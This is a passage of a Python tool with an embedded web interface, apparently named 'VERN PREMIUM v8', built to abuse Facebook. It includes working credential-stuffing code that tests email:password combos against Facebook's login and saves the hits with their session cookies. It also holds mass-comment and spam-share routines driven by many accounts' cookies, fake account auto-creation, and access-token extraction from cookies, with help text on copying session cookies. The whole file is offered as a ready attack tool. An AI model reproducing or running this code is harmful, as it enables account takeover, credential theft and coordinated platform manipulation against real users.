                'jazoest': jaz_m.group(1) if jaz_m else '',
                'm_ts': str(int(time.time())), 'li': '0',
                'try_number': '0', 'unrecognized_tries': '0', 'bi_xrwh': '0',
            }
            r = s.post(
                "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=110",
                data=data, timeout=15, allow_redirects=True
            )
            c_user = s.cookies.get('c_user')
            xs     = s.cookies.get('xs')

            if c_user and xs:
                log_ok(f"[{i}] HIT: {email} | UID={c_user}")
                full_ck = '; '.join(f"{k}={v}" for k,v in s.cookies.items())
                results['hit'].append({'email':email,'password':pw,'uid':c_user,'cookies':full_ck})
            elif 'checkpoint' in r.url or 'checkpoint' in r.text.lower():
                log_w(f"[{i}] CHECKPOINT: {email}")
                results['hit'].append({'email':email,'password':pw,'uid':'checkpoint','status':'checkpoint'})
            elif 'login' in r.url or 'error' in r.url:
                log_er(f"[{i}] DEAD: {email}")
                results['dead'].append(combo)
            else:
                log_w(f"[{i}] UNKNOWN: {email} — {r.status_code}")
        except Exception as e:
            log_er(f"[{i}] ERROR {combo}: {e}")
            results['error'].append(combo)

        if i < len(combo_list):
            time.sleep(speed)

    if results['hit']:
        fn = f"/sdcard/fb_hits_{int(time.time())}.txt"
        try:
            with open(fn, 'w') as f:
                for h in results['hit']:
                    f.write(f"{h['email']}:{h['password']}:{h.get('uid','?')}\n")
                    if 'cookies' in h:
                        f.write(f"  cookie: {h['cookies'][:120]}\n")
            log_ok(f"Hits saved to {fn}")
        except:
            fn = f"/tmp/fb_hits_{int(time.time())}.txt"
            with open(fn, 'w') as f:
                for h in results['hit']:
                    f.write(f"{h['email']}:{h['password']}:{h.get('uid','?')}\n")
            log_ok(f"Hits saved to {fn}")

    log_in(f"Done: {len(results['hit'])} hits | {len(results['dead'])} dead | {len(results['error'])} errors")
    return results

# ── MASS AUTO COMMENT ─────────────────────────────────────────────────────────
def post_comment(session, post_id, comment, tokens):
    """Post a comment via mbasic form or GraphQL."""
    uid  = tokens.get('uid', '')
    dtsg = tokens.get('fb_dtsg', '')
    lsd  = tokens.get('lsd', '')
    jaz  = tokens.get('jazoest') or (compute_jazoest(dtsg) if dtsg else '')

    # Method A: mbasic comment form
    for url in [f"https://mbasic.facebook.com/story.php?story_fbid={post_id}&id={uid}",
                f"https://mbasic.facebook.com/{post_id}"]:
        try:
            r = session.get(url, timeout=15)
            html = r.text
            form_m = re.search(
                r'<form[^>]+action="(/story/mentions/feed/[^"]*|/[^"]*comment[^"]*)"[^>]*>(.*?)</form>',
                html, re.DOTALL | re.I
            )
            if form_m:
                action = form_m.group(1).replace('&amp;','&')
                if not action.startswith('http'):
                    action = 'https://mbasic.facebook.com' + action
                fd = {}
                for inp in re.finditer(r'<input[^>]+>', form_m.group(2), re.I):
                    s2 = inp.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', s2)
                    vl = re.search(r'value=["\']([^"\']*)["\']', s2)
                    if nm: fd[nm.group(1)] = vl.group(1) if vl else ''
                fd.update({'comment_text': comment, 'fb_dtsg': dtsg, 'lsd': lsd, 'jazoest': jaz})
                r2 = session.post(action, data=fd, timeout=15, allow_redirects=True)
                if r2.status_code in (200, 302):
                    return True, "Comment OK (mbasic)"
        except Exception:
            pass

    # Method B: GraphQL comment mutation
    try:
        fid = base64.b64encode(f"feedback:{post_id}".encode()).decode()
        variables = json.dumps({"input": {
            "client_mutation_id": str(random.randint(1,99)),
            "actor_id": uid,
            "feedback_id": fid,
            "message": {"text": comment, "ranges": []},
        }})
        data = {
            'av': uid, '__user': uid, '__a': '1',
            'lsd': lsd, 'jazoest': jaz, 'fb_dtsg': dtsg,
            'fb_api_req_friendly_name': 'CometUFICreateCommentMutation',
            'variables': variables,
            'doc_id': '4909704485759688',
        }
        headers = {'x-fb-lsd': lsd, 'content-type': 'application/x-www-form-urlencoded'}
        r = session.post('https://www.facebook.com/api/graphql/', data=data, headers=headers, timeout=15)
        if r.status_code == 200 and 'OAuthException' not in r.text[:200]:
            return True, "Comment OK (GraphQL)"
    except Exception:
        pass

    return False, "Comment failed"

def mass_auto_comment(ck_list, post_id, comments, speed=3, repeat=1):
    """Post comments from multiple accounts."""
    total = len(ck_list)
    ok_count = 0
    log_in(f"Mass Comment: {total} accounts | post={post_id}")

    for rep in range(repeat):
        if repeat > 1:
            log_in(f"Round {rep+1}/{repeat}")
        for i, ck in enumerate(ck_list, 1):
            uid     = get_uid(ck)
            comment = comments[(i - 1) % len(comments)]
            tokens  = extract_fb_tokens(ck)
            session = make_session(ck, CURL_UA)
            ok, msg = post_comment(session, post_id, comment, tokens)
            if ok:
                ok_count += 1
                log_ok(f"[{i}/{total}] UID={uid} → {comment[:30]}")
            else:
                log_er(f"[{i}/{total}] UID={uid} → {msg}")
            if i < total or rep < repeat - 1:
                time.sleep(speed)

    log_in(f"Mass Comment done: {ok_count}/{total} OK")
    return ok_count

# ── WEB INTERFACE HTML ────────────────────────────────────────────────────────
WEB_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>VERN PREMIUM v8 — Lara APK Edition</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#05050f;color:#ddd;font-family:'Courier New',monospace;min-height:100vh;padding-bottom:40px}
.header{background:linear-gradient(135deg,#12001a,#000060);padding:18px;text-align:center;border-bottom:2px solid #5500ee}
.header h1{color:#ee00ff;font-size:1.3em;text-shadow:0 0 12px #ee00ff;letter-spacing:2px}
.header p{color:#00ddff;font-size:.75em;margin-top:4px}
.nav{display:flex;flex-wrap:wrap;gap:6px;padding:12px 15px;background:#08081a}
.nav button{background:#100030;color:#00ddff;border:1px solid #5500ee;padding:7px 13px;cursor:pointer;border-radius:4px;font-size:.82em;font-family:inherit;transition:.2s}
.nav button:hover,.nav button.active{background:#5500ee;color:#fff;border-color:#cc00ff}
.container{padding:18px;max-width:860px;margin:auto}
.panel{display:none}.panel.active{display:block}
.card{background:#0a0a20;border:1px solid #2a0055;border-radius:8px;padding:16px;margin-bottom:14px}
.card h3{color:#bb00ff;margin-bottom:10px;font-size:.95em;border-bottom:1px solid #2a0055;padding-bottom:7px}
label{display:block;color:#777;font-size:.78em;margin:9px 0 3px}
input,textarea,select{width:100%;background:#07071a;border:1px solid #380077;color:#ddd;padding:7px 9px;border-radius:4px;font-family:inherit;font-size:.82em;outline:none}
input:focus,textarea:focus{border-color:#8800ff}
textarea{min-height:80px;resize:vertical}
.btn{background:linear-gradient(135deg,#5500ee,#8800cc);color:#fff;border:none;padding:10px 18px;cursor:pointer;border-radius:4px;font-size:.88em;margin-top:10px;width:100%;font-family:inherit;font-weight:bold;letter-spacing:1px}
.btn:hover{background:linear-gradient(135deg,#6600ff,#9900dd)}
.btn.danger{background:linear-gradient(135deg,#bb0000,#770000)}
.log{background:#020210;border:1px solid #2a0055;border-radius:4px;padding:10px;max-height:280px;overflow-y:auto;font-size:.78em;line-height:1.6;white-space:pre-wrap;margin-top:10px;color:#aaa}
.log .ok{color:#00ff88}.log .er{color:#ff4444}.log .in{color:#00ccff}.log .w{color:#ffaa00}
.react-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin:8px 0}
.react-btn{background:#0e001e;border:1px solid #380077;color:#ccc;padding:9px;cursor:pointer;border-radius:6px;text-align:center;font-size:.88em;transition:.2s;font-family:inherit}
.react-btn:hover,.react-btn.selected{background:#5500ee;border-color:#cc00ff;color:#fff}
.row{display:flex;gap:10px}.row>*{flex:1}
.version-badge{display:inline-block;background:#5500ee;color:#fff;font-size:.7em;padding:2px 8px;border-radius:10px;margin-left:8px}
</style>
</head>
<body>
<div class="header">
  <h1>⚡ VERN PREMIUM <span class="version-badge">v8</span> — LARA APK EDITION ⚡</h1>
  <p>6-Method Reactor &nbsp;|&nbsp; Cookie-Based &nbsp;|&nbsp; mbasic + GraphQL + Graph API</p>
</div>
<div class="nav">
  <button class="active" onclick="showPanel('react',this)">⚡ Auto React</button>
  <button onclick="showPanel('share',this)">🔁 Spam Share</button>
  <button onclick="showPanel('comment',this)">💬 Mass Comment</button>
  <button onclick="showPanel('create',this)">👤 Auto Create</button>
  <button onclick="showPanel('clone',this)">🔓 FB Clone</button>
  <button onclick="showPanel('token',this)">🔑 Get Token</button>
  <button onclick="showPanel('help',this)">ℹ️ Help</button>
</div>
<div class="container">

<!-- AUTO REACT -->
<div id="panel-react" class="panel active">
  <div class="card">
    <h3>⚡ Auto Reaction — 6-Method Lara Engine</h3>
    <label>Post URL</label>
    <input id="r-url" placeholder="https://www.facebook.com/.../posts/..." />
    <label>Reaction Type</label>
    <div class="react-grid">
      <button class="react-btn selected" onclick="selReact(this,'LIKE')">👍 LIKE</button>
      <button class="react-btn" onclick="selReact(this,'LOVE')">❤️ LOVE</button>
      <button class="react-btn" onclick="selReact(this,'HAHA')">😆 HAHA</button>
      <button class="react-btn" onclick="selReact(this,'WOW')">😮 WOW</button>
      <button class="react-btn" onclick="selReact(this,'SAD')">😢 SAD</button>
      <button class="react-btn" onclick="selReact(this,'ANGRY')">😡 ANGRY</button>
    </div>
    <input id="r-react-type" type="hidden" value="LIKE">
    <label>Cookies (one per line — each line = one account)</label>
    <textarea id="r-cookies" placeholder="c_user=...; xs=...; fr=...&#10;c_user=...; xs=...; fr=..."></textarea>
    <label>Access Tokens (optional, one per line — leave blank to auto-extract)</label>
    <textarea id="r-tokens" placeholder="EAA... (optional)" style="min-height:50px"></textarea>
    <div class="row">
      <div><label>Delay (sec)</label><input id="r-speed" type="number" value="2" min="0" max="60"></div>
      <div><label>Repeat Rounds</label><input id="r-repeat" type="number" value="1" min="1" max="100"></div>
    </div>
    <button class="btn" onclick="runReact()">⚡ START AUTO REACTION</button>
  </div>
  <div class="log" id="log-react">[ Ready — 6-method Lara APK reactor ]\n</div>
</div>

<!-- SPAM SHARE -->
<div id="panel-share" class="panel">
  <div class="card">
    <h3>🔁 Spam Share</h3>
    <label>Post URL to Share</label>
    <input id="s-url" placeholder="https://www.facebook.com/..." />
    <label>Cookie</label>
    <textarea id="s-cookies" placeholder="c_user=...; xs=...; fr=..." style="min-height:55px"></textarea>
    <div class="row">
      <div><label>Count</label><input id="s-count" type="number" value="10" min="1" max="500"></div>
      <div><label>Delay (sec)</label><input id="s-speed" type="number" value="3" min="0" max="60"></div>
    </div>
    <button class="btn" onclick="runShare()">🔁 START SPAM SHARE</button>
  </div>
  <div class="log" id="log-share">[ Ready ]\n</div>
</div>

<!-- MASS COMMENT -->
<div id="panel-comment" class="panel">
  <div class="card">
    <h3>💬 Mass Auto Comment</h3>
    <label>Post URL</label>
    <input id="c-url" placeholder="https://www.facebook.com/..." />
    <label>Comments (one per line)</label>
    <textarea id="c-comments" placeholder="Nice post! 🔥&#10;Great content!&#10;Love this! ❤️"></textarea>
    <label>Cookies (one per line = one account)</label>
    <textarea id="c-cookies" placeholder="c_user=...; xs=...&#10;c_user=...; xs=..."></textarea>
    <div class="row">
      <div><label>Delay (sec)</label><input id="c-speed" type="number" value="3" min="0" max="60"></div>
      <div><label>Rounds</label><input id="c-repeat" type="number" value="1" min="1" max="50"></div>
    </div>
    <button class="btn" onclick="runComment()">💬 START MASS COMMENT</button>
  </div>
  <div class="log" id="log-comment">[ Ready ]\n</div>
</div>

<!-- AUTO CREATE -->
<div id="panel-create" class="panel">
  <div class="card">
    <h3>👤 Auto Create (AU2)</h3>
    <div class="row">
      <div><label>Count</label><input id="ac-count" type="number" value="5" min="1" max="50"></div>
      <div><label>Email Prefix</label><input id="ac-email" placeholder="prefix (optional)"></div>
    </div>
    <label>Delay (sec)</label>
    <input id="ac-speed" type="number" value="5" min="1" max="60">
    <button class="btn" onclick="runCreate()">👤 START AUTO CREATE</button>
  </div>
  <div class="log" id="log-create">[ Ready ]\n</div>
</div>

<!-- FB CLONE -->
<div id="panel-clone" class="panel">
  <div class="card">
    <h3>🔓 FB Clone / Cracking</h3>
    <label>Combos (email:password or email|password — one per line)</label>
    <textarea id="cl-combos" placeholder="user@gmail.com:password123&#10;another@yahoo.com|pass456"></textarea>
    <label>Delay (sec)</label>
    <input id="cl-speed" type="number" value="1" min="0" max="30">
    <button class="btn danger" onclick="runClone()">🔓 START CRACKING</button>
  </div>
  <div class="log" id="log-clone">[ Ready ]\n</div>
</div>

<!-- GET TOKEN -->
<div id="panel-token" class="panel">
  <div class="card">
    <h3>🔑 Extract Access Token — Lara Method</h3>
    <p style="color:#666;font-size:.8em;margin-bottom:10px">Uses OAuth implicit + confirm + b-api exchange. Same method as Lara APK.</p>
    <label>Cookie String</label>
    <textarea id="t-cookies" placeholder="c_user=...; xs=...; fr=...; datr=..."></textarea>
    <button class="btn" onclick="runToken()">🔑 EXTRACT TOKEN</button>
    <div class="log" id="log-token">[ Ready ]\n</div>
  </div>
</div>

<!-- HELP -->
<div id="panel-help" class="panel">
  <div class="card">
    <h3>ℹ️ How to Use</h3>
    <p style="color:#999;font-size:.82em;line-height:1.9">
    <b style="color:#00ddff">Get Cookie (Browser):</b><br>
    1. Open Facebook → F12 → Application → Cookies → facebook.com<br>
    2. Find: <b>c_user, xs, fr, datr, sb</b><br>
    3. Paste as: <code style="color:#88ff88">c_user=VALUE; xs=VALUE; fr=VALUE; datr=VALUE</code><br><br>
    <b style="color:#00ddff">Get Cookie (Termux/Android):</b><br>
    1. Install Firefox on Android, login to Facebook<br>
    2. Use cookie exporter addon → copy full cookie string<br><br>
    <b style="color:#ee00ff">Reaction Engine (6 methods):</b><br>
    M1: Graph API with access_token<br>
    M2: mbasic like link → confirm<br>
    M3: UFI endpoint<br>
    M4: GraphQL mutation (8 doc_ids tried)<br>
    M5: mbasic UFI form<br>
    M6: Lara /get_reactions endpoint<br><br>
    <b style="color:#ffaa00">Note:</b> Checkpointed/new accounts may fail on some methods. Active aged accounts work best.
    </p>
  </div>
</div>

</div>

<script>
let rType = 'LIKE';
function showPanel(name, btn) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
  document.getElementById('panel-'+name).classList.add('active');
  if (btn) btn.classList.add('active');
}
function selReact(el, type) {
  document.querySelectorAll('.react-btn').forEach(b => b.classList.remove('selected'));
  el.classList.add('selected');
  rType = type;
  document.getElementById('r-react-type').value = type;
}
function log(id, msg, cls) {
  const el = document.getElementById(id);
  const span = document.createElement('span');
  span.className = cls || '';
  span.textContent = msg + '\\n';
  el.appendChild(span);
  el.scrollTop = el.scrollHeight;
}

async function post(url, body) {
  const r = await fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)});
  return r.json();
}

async function runReact() {
  const url = document.getElementById('r-url').value.trim();
  const cookies = document.getElementById('r-cookies').value.trim();
  const tokens = document.getElementById('r-tokens').value.trim();
  const reaction = document.getElementById('r-react-type').value;
  const speed = +document.getElementById('r-speed').value;
  const repeat = +document.getElementById('r-repeat').value;
  if (!url || !cookies) { alert('Enter post URL and cookies'); return; }
  const lid = 'log-react';
  document.getElementById(lid).innerHTML = '';
  log(lid, '[*] Starting ' + reaction + ' reaction...', 'in');
  try {
    const d = await post('/api/react', {url, cookies, tokens, reaction, speed, repeat});
    (d.logs||[]).forEach(l => log(lid, l.msg, l.type));
    log(lid, '[Done] ' + d.ok + ' OK | ' + d.fail + ' failed', d.ok>0?'ok':'er');
  } catch(e) { log(lid, '[-] '+e.message, 'er'); }
}

async function runShare() {
  const url = document.getElementById('s-url').value.trim();
  const cookies = document.getElementById('s-cookies').value.trim();
  const count = +document.getElementById('s-count').value;
  const speed = +document.getElementById('s-speed').value;
  if (!url || !cookies) { alert('Enter URL and cookies'); return; }
  const lid = 'log-share';
  document.getElementById(lid).innerHTML = '';
  log(lid, '[*] Starting spam share x'+count, 'in');
  try {
    const d = await post('/api/share', {url, cookies, count, speed});
    (d.logs||[]).forEach(l => log(lid, l.msg, l.type));
    log(lid, '[Done] '+d.ok+'/'+count+' OK', d.ok>0?'ok':'er');
  } catch(e) { log(lid, '[-] '+e.message, 'er'); }
}

async function runComment() {
  const url = document.getElementById('c-url').value.trim();
  const comments = document.getElementById('c-comments').value.trim();
  const cookies = document.getElementById('c-cookies').value.trim();
  const speed = +document.getElementById('c-speed').value;
  const repeat = +document.getElementById('c-repeat').value;
  if (!url || !cookies || !comments) { alert('Fill all fields'); return; }
  const lid = 'log-comment';
  document.getElementById(lid).innerHTML = '';
  log(lid, '[*] Starting mass comment...', 'in');
  try {
    const d = await post('/api/comment', {url, comments, cookies, speed, repeat});
    (d.logs||[]).forEach(l => log(lid, l.msg, l.type));
    log(lid, '[Done] '+d.ok+' OK', d.ok>0?'ok':'er');
  } catch(e) { log(lid, '[-] '+e.message, 'er'); }
}

async function runCreate() {
  const count = +document.getElementById('ac-count').value;
  const prefix = document.getElementById('ac-email').value.trim();
  const speed = +document.getElementById('ac-speed').value;
  const lid = 'log-create';
  document.getElementById(lid).innerHTML = '';
  log(lid, '[*] Creating '+count+' accounts...', 'in');
  try {
    const d = await post('/api/create', {count, email_prefix: prefix, speed});
    (d.logs||[]).forEach(l => log(lid, l.msg, l.type));
    log(lid, '[Done] '+d.created+' created', d.created>0?'ok':'er');
  } catch(e) { log(lid, '[-] '+e.message, 'er'); }
}

async function runClone() {
  const combos = document.getElementById('cl-combos').value.trim();
  const speed = +document.getElementById('cl-speed').value;
  if (!combos) { alert('Enter combos'); return; }
  const lid = 'log-clone';
  document.getElementById(lid).innerHTML = '';
  log(lid, '[*] Starting FB Clone...', 'in');
  try {
    const d = await post('/api/clone', {combos, speed});
    (d.logs||[]).forEach(l => log(lid, l.msg, l.type));
    log(lid, '[Done] '+d.hits+' hits | '+d.dead+' dead', d.hits>0?'ok':'in');
  } catch(e) { log(lid, '[-] '+e.message, 'er'); }
}

async function runToken() {
  const cookies = document.getElementById('t-cookies').value.trim();
  if (!cookies) { alert('Enter cookies'); return; }
  const lid = 'log-token';
  document.getElementById(lid).innerHTML = '';
  log(lid, '[*] Extracting token (Lara method)...', 'in');
  try {
    const d = await post('/api/token', {cookies});
    if (d.token) {
      log(lid, '[+] TOKEN FOUND:', 'ok');
      log(lid, d.token, 'ok');
    } else {
      log(lid, '[-] No token: '+d.error, 'er');
    }
    (d.logs||[]).forEach(l => log(lid, l.msg, l.type));
  } catch(e) { log(lid, '[-] '+e.message, 'er'); }
}
</script>
</body>
</html>"""

# ── HTTP SERVER ───────────────────────────────────────────────────────────────
class WebHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass

    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)

    def read_body(self):
        n = int(self.headers.get('Content-Length', 0))
        if n:
            return json.loads(self.rfile.read(n))
        return {}

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(WEB_HTML.encode())

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        path = self.path.split('?')[0]
        body = self.read_body()
        logs = []
        def L(msg, t='in'): logs.append({'msg': msg, 'type': t})

        try:
            if path == '/api/react':
                cookies_raw = body.get('cookies', '')
                tokens_raw  = body.get('tokens', '')
                url         = body.get('url', '')
                reaction    = body.get('reaction', 'LIKE')
                speed       = float(body.get('speed', 2))
                repeat      = int(body.get('repeat', 1))

                ck_list = [parse_cookie(l.strip()) for l in cookies_raw.splitlines() if l.strip()]
                atk_list = [t.strip() for t in tokens_raw.splitlines() if t.strip()]
                _, post_id = parse_post_url(url)

                if not post_id:
                    return self.send_json({'ok':0,'fail':0,'logs':[{'msg':'Cannot parse post ID','type':'er'}]})

                ok_c = fail_c = 0
                for rnd in range(repeat):
                    for i, ck in enumerate(ck_list):
                        uid = get_uid(ck)
                        atk = atk_list[i] if i < len(atk_list) else None
                        L(f"[{i+1}/{len(ck_list)}] UID={uid} {reaction}...", 'in')
                        ok, msg = do_react(ck, post_id, reaction, atk)
                        if ok:
                            ok_c += 1
                            L(f"[+] {msg}", 'ok')
                        else:
                            fail_c += 1
                            L(f"[-] {msg}", 'er')
                        if i < len(ck_list) - 1 or rnd < repeat - 1:
                            time.sleep(speed)

                return self.send_json({'ok': ok_c, 'fail': fail_c, 'logs': logs})

            elif path == '/api/share':
                ck = parse_cookie(body.get('cookies', ''))
                url = body.get('url', '')
                count = int(body.get('count', 10))
                speed = float(body.get('speed', 3))
                _, post_id = parse_post_url(url)
                if not post_id:
                    return self.send_json({'ok':0,'logs':[{'msg':'Bad URL','type':'er'}]})
                ok = spam_share(ck, url, count, speed)
                L(f"Done: {ok}/{count} shares", 'ok' if ok > 0 else 'er')
                return self.send_json({'ok': ok, 'logs': logs})

            elif path == '/api/comment':
                cookies_raw = body.get('cookies', '')
                ck_list = [parse_cookie(l.strip()) for l in cookies_raw.splitlines() if l.strip()]
                comments = [l.strip() for l in body.get('comments','').splitlines() if l.strip()]
                url = body.get('url', '')
                speed = float(body.get('speed', 3))
                repeat = int(body.get('repeat', 1))
                _, post_id = parse_post_url(url)
                if not post_id or not ck_list or not comments:
                    return self.send_json({'ok':0,'logs':[{'msg':'Bad input','type':'er'}]})
                ok = mass_auto_comment(ck_list, post_id, comments, speed, repeat)
                L(f"Done: {ok} OK", 'ok' if ok else 'er')
                return self.send_json({'ok': ok, 'logs': logs})

            elif path == '/api/create':
                count = int(body.get('count', 5))
                prefix = body.get('email_prefix','') or None
                speed = float(body.get('speed', 5))
                results = auto_create(count, prefix, speed)
                for acc in results:
                    L(f"[+] {acc['email']} | {acc['password']}", 'ok')
                return self.send_json({'created': len(results), 'logs': logs})

            elif path == '/api/clone':
                combos_raw = body.get('combos', '')
                combos = [l.strip() for l in combos_raw.splitlines() if l.strip()]
                speed = float(body.get('speed', 1))
                results = fb_clone_crack(combos, speed)
                for h in results['hit']:
                    L(f"[+] HIT: {h['email']}:{h['password']} UID={h.get('uid','?')}", 'ok')
                return self.send_json({'hits': len(results['hit']), 'dead': len(results['dead']), 'logs': logs})

            elif path == '/api/token':
                ck = parse_cookie(body.get('cookies', ''))
                uid = get_uid(ck)
                L(f"[*] UID={uid}...", 'in')
                tok = extract_access_token(ck)
                if tok:
                    L("[+] Token extracted!", 'ok')
                    return self.send_json({'token': tok, 'logs': logs})
                else:
                    # Fallback: return fb_dtsg info
                    tokens = extract_fb_tokens(ck)
                    if tokens.get('fb_dtsg'):
                        L(f"[!] No OAuth token, but fb_dtsg available", 'w')
                        L(f"fb_dtsg: {tokens['fb_dtsg'][:40]}...", 'in')
                    return self.send_json({'token': None, 'error': 'OAuth token not available', 'logs': logs})

            else:
                return self.send_json({'error': 'Not found'}, 404)

        except Exception as e:
            logs.append({'msg': f'Server error: {e}', 'type': 'er'})
            return self.send_json({'error': str(e), 'logs': logs}, 500)

def start_web_server(port=8080):
    socketserver.TCPServer.allow_reuse_address = True
    server = socketserver.TCPServer(('0.0.0.0', port), WebHandler)
    log_in(f"Web server started on http://0.0.0.0:{port}")
    log_in(f"Open browser: http://localhost:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log_w("Server stopped")
        server.shutdown()

# ── INPUT HELPERS ─────────────────────────────────────────────────────────────
def inp(prompt, default=None):
    try:
        v = input(c('y', f'\n  {prompt}') + c('dim', f' [{default}]' if default else '') + c('y', ' → ')).strip()
        return v or (default or '')
    except (KeyboardInterrupt, EOFError):
        print()
        return default or ''

def get_multi_cookies():
    print(c('c', '\n  Paste cookies (one per line, blank line when done):'))
    lines = []
    while True:
        try:
            line = input(f'  [{len(lines)+1}] ').strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not line:
            break
        ck = parse_cookie(line)
        if ck:
            lines.append(ck)
    return lines

# ── MENU HANDLERS ─────────────────────────────────────────────────────────────
def menu_react():
    banner()
    print(c('m', '  ⚡ AUTO REACTION — 6-METHOD LARA ENGINE\n'))
    post_url = inp("Post URL")
    if not post_url:
        return
    _, post_id = parse_post_url(post_url)
    if not post_id:
        log_er("Could not parse post ID")
        return

    print(c('c', '\n  Reactions: 1=LIKE 👍  2=LOVE ❤️  3=HAHA 😆  4=WOW 😮  5=SAD 😢  6=ANGRY 😡'))
    rt_in    = inp("Reaction (1-6 or name)", "1")
    reaction = REACTION_TYPES.get(rt_in.upper(), 'LIKE')
    ck_list  = get_multi_cookies()
    if not ck_list:
        log_er("No cookies")
        return

    speed  = float(inp("Delay between accounts (sec)", "2"))
    repeat = int(inp("Rounds", "1"))

    log_in("Checking access tokens...")
    atks = []
    for ck in ck_list[:5]:
        tok = extract_access_token(ck)
        atks.append(tok)
        if tok:
            log_ok(f"UID={get_uid(ck)} → token found")

    print()
    for rnd in range(repeat):
        if repeat > 1:
            log_in(f"Round {rnd+1}/{repeat}")
        for i, ck in enumerate(ck_list, 1):
            uid = get_uid(ck)
            atk = atks[i-1] if i <= len(atks) else None
            ok, msg = do_react(ck, post_id, reaction, atk)
            if ok:
                log_ok(f"[{i}/{len(ck_list)}] UID={uid} → {REACTION_NAMES.get(reaction,'REACT')} ✓")
            else:
                log_er(f"[{i}/{len(ck_list)}] UID={uid} → FAILED | {msg[:80]}")
            if i < len(ck_list) or rnd < repeat - 1:
                time.sleep(speed)

    input(c('dim', '\n  Press Enter...'))

def menu_share():
    banner()
    print(c('m', '  🔁 SPAM SHARE\n'))
    post_url = inp("Post URL")
    ck_list  = get_multi_cookies()
    count    = int(inp("Share count", "10"))
    speed    = float(inp("Delay (sec)", "3"))
    print()
    for ck in ck_list:
        spam_share(ck, post_url, count, speed)
    input(c('dim', '\n  Press Enter...'))

def menu_comment():
    banner()
    print(c('m', '  💬 MASS AUTO COMMENT\n'))
    post_url = inp("Post URL")
    _, post_id = parse_post_url(post_url)
    if not post_id:
        log_er("Bad URL")
        return

    print(c('c', '\n  Comments (blank line to end):'))
    comments = []
    while True:
        try:
            line = input(f'  [{len(comments)+1}] ').strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not line:
            break
        comments.append(line)

    if not comments:
        comments = ["Nice! 🔥", "Great post!", "Love this! ❤️"]

    ck_list = get_multi_cookies()
    speed   = float(inp("Delay (sec)", "3"))
    repeat  = int(inp("Rounds", "1"))
    print()
    mass_auto_comment(ck_list, post_id, comments, speed, repeat)
    input(c('dim', '\n  Press Enter...'))

def menu_create():
    banner()
    print(c('m', '  👤 AUTO CREATE (AU2)\n'))
    count  = int(inp("Account count", "5"))
    prefix = inp("Email prefix (optional)")
    speed  = float(inp("Delay (sec)", "5"))
    print()
    auto_create(count, prefix or None, speed)
    input(c('dim', '\n  Press Enter...'))

def menu_clone():
    banner()
    print(c('m', '  🔓 FB CLONE / CRACKING\n'))
    print(c('c', '  Combos email:password (blank to end):'))
    combos = []
    while True:
        try:
            line = input(f'  [{len(combos)+1}] ').strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not line:
            break
        combos.append(line)

    if not combos:
        log_er("No combos")
        return
    speed = float(inp("Delay (sec)", "1"))
    print()
    fb_clone_crack(combos, speed)
    input(c('dim', '\n  Press Enter...'))

def menu_token():
    banner()
    print(c('m', '  🔑 EXTRACT ACCESS TOKEN\n'))
    ck_raw = inp("Paste cookie string")
    if not ck_raw:
        return
    ck  = parse_cookie(ck_raw)
    uid = get_uid(ck)
    log_in(f"UID={uid} — extracting token (Lara method)...")
    tok = extract_access_token(ck)
    if tok:
        log_ok(f"ACCESS TOKEN:\n{tok}")
    else:
        log_w("OAuth token unavailable — extracting session tokens...")
        tokens = extract_fb_tokens(ck, verbose=True)
        if tokens.get('fb_dtsg'):
            log_ok(f"fb_dtsg: {tokens['fb_dtsg']}")
            log_ok(f"lsd: {tokens.get('lsd') or 'null (normal for new/mobile accounts)'}")
            log_ok(f"jazoest: {tokens.get('jazoest')}")
        else:
            log_er("No tokens found — check if cookie is valid")
    input(c('dim', '\n  Press Enter...'))

def menu_web():
    banner()
    port = int(inp("Port", "8080"))
    log_in(f"Starting web UI → http://localhost:{port}")
    log_in("Ctrl+C to stop")
    print()
    start_web_server(port)

# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    while True:
        banner()
        try:
            choice = input(c('y', '\n  Select → ')).strip()
        except (KeyboardInterrupt, EOFError):
            print(c('g', '\n  Goodbye!'))
            break

        if choice == '1':
            menu_share()
        elif choice == '2':
            menu_create()
        elif choice == '3':
            menu_clone()
        elif choice == '4':
            menu_comment()
        elif choice == '5':
            menu_react()
        elif choice == '6':
            menu_web()
        elif choice == '7':
            menu_token()
        elif choice == '8':
            print(c('g', '\n  Goodbye!'))
            break

if __name__ == '__main__':
    main()
